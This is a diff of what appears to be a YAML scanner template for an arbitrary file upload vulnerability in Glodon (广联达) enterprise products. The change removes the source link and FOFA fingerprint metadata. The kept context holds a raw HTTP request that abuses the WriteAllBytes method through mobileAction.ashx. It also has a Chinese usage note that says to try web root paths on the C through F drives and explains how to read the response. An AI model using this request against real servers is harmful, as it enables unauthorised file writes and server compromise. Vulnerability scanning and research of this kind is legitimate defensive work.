@@ -3,12 +3,8 @@ info:
   name: 广联达 WriteAllBytes 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xxm43zotnp93sm75'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xxm43zotnp93sm75
-    fofa: app="Glodon-企业管理产品"
 http:
 - raw:
   - 'POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes HTTP/1.1
@@ -35,7 +31,6 @@ http:
     Host: {{Hostname}}
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
-
 
 
     注意：此上传为文件写入上传，因此需要自己找网站物理路径，上述物理路径是多次实验取的大多数的通用路径，有个别站点物理路径不会上面的。建议遍历C、D、E、F盘进行上传。如果上传包响应里面出现“没有此路径”的关键字，说明大概率存在漏洞，只是物理路径没有给正确。'
